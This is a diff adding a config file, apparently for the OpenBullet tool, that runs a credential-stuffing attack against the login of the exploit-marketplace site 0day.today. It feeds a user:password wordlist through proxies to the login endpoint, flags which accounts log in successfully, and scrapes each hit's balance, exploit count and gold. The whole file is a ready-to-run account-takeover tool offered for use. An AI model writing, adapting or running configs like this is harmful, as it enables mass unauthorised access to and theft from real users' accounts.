@@ -1,0 +1,52 @@
+[SETTINGS]
+{
+  "Name": "0day.today",
+  "SuggestedBots": 1,
+  "LastModified": "2018-05-24T04:16:49.3796125+00:00",
+  "AdditionalInfo": "",
+  "Author": "Secant",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#Get_Homepage REQUEST POST "https://en.0day.today/" AutoRedirect=TRUE 
+  CONTENT "agree=Yes%2C+I+agree" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "origin: https://en.0day.today" 
+  HEADER "referer: https://en.0day.today/" 
+#POST_Login REQUEST POST "https://en.0day.today/auth/check" AutoRedirect=TRUE 
+  CONTENT "login=<USER>&pass=<PASS>&auth=&auth=Submit" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://en.0day.today/auth" 
+  HEADER "origin: https://en.0day.today" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Login or password is incorrect" 
+  KEYCHAIN Success OR 
+    KEY "Reg date" 
+  KEYCHAIN Retry OR 
+    KEY "Do you agree to these terms" 
+#PARSE_BL PARSE "<SOURCE>" CSS "div.user_table > div:nth-child(2) > div:nth-child(2)" "innerHTML" 0 -> CAP "BL" "" "" 
+#PARSE_Exploits PARSE "<SOURCE>" CSS "div.user_table > div:nth-child(3) > div:nth-child(2)" "innerHTML" 0 -> CAP "Exploits" "" "" 
+#PARSE_Gold PARSE "<SOURCE>" LR "add exploit</a> ]
+					[ <a href='/gold' class='YellowTextGold'>" "</a> " Recursive=FALSE -> CAP "Gold" "" "" 
